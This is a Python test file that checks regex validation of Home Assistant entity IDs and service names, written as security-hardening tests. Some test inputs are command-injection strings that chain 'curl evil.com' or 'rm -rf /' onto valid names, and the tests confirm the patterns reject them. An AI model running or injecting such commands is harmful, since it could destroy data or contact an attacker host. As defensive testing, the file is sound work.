"""
Tests for ha_integration.py — Entity ID and service name validation.

Tests the regex validation added during the security hardening phase.
"""

import re
import pytest


# Extracted from ha_integration.py call_service() validation
ENTITY_ID_PATTERN = r'^[a-z_]+\.[a-z0-9_]+$'
SERVICE_PATTERN = r'^[a-z_]+$'


class TestEntityIdValidation:
    def test_valid_light(self):
        assert re.match(ENTITY_ID_PATTERN, "light.bedroom_fan_lights")

    def test_valid_switch(self):
        assert re.match(ENTITY_ID_PATTERN, "switch.office_desk")

    def test_valid_scene(self):
        assert re.match(ENTITY_ID_PATTERN, "scene.movie_night")

    def test_valid_climate(self):
        assert re.match(ENTITY_ID_PATTERN, "climate.living_room")

    def test_valid_sensor_with_numbers(self):
        assert re.match(ENTITY_ID_PATTERN, "sensor.temp_sensor_2")

    def test_invalid_injection_semicolon(self):
        assert not re.match(ENTITY_ID_PATTERN, "light.bedroom; curl evil.com")

    def test_invalid_injection_pipe(self):
        assert not re.match(ENTITY_ID_PATTERN, "light.bedroom | rm -rf /")

    def test_invalid_no_domain(self):
        assert not re.match(ENTITY_ID_PATTERN, "bedroom_lights")

    def test_invalid_uppercase(self):
        assert not re.match(ENTITY_ID_PATTERN, "Light.Bedroom")

    def test_invalid_spaces(self):
        assert not re.match(ENTITY_ID_PATTERN, "light.bed room")

    def test_invalid_special_chars(self):
        assert not re.match(ENTITY_ID_PATTERN, "light.bedroom$")

    def test_invalid_empty(self):
        assert not re.match(ENTITY_ID_PATTERN, "")


class TestServiceValidation:
    def test_valid_turn_on(self):
        assert re.match(SERVICE_PATTERN, "turn_on")

    def test_valid_turn_off(self):
        assert re.match(SERVICE_PATTERN, "turn_off")

    def test_valid_toggle(self):
        assert re.match(SERVICE_PATTERN, "toggle")

    def test_valid_set_temperature(self):
        assert re.match(SERVICE_PATTERN, "set_temperature")

    def test_valid_play_media(self):
        assert re.match(SERVICE_PATTERN, "play_media")

    def test_invalid_injection(self):
        assert not re.match(SERVICE_PATTERN, "turn_on; curl evil.com")

    def test_invalid_uppercase(self):
        assert not re.match(SERVICE_PATTERN, "Turn_On")

    def test_invalid_spaces(self):
        assert not re.match(SERVICE_PATTERN, "turn on")

    def test_invalid_numbers(self):
        # Service names shouldn't have numbers
        assert not re.match(SERVICE_PATTERN, "service123")

    def test_invalid_empty(self):
        assert not re.match(SERVICE_PATTERN, "")
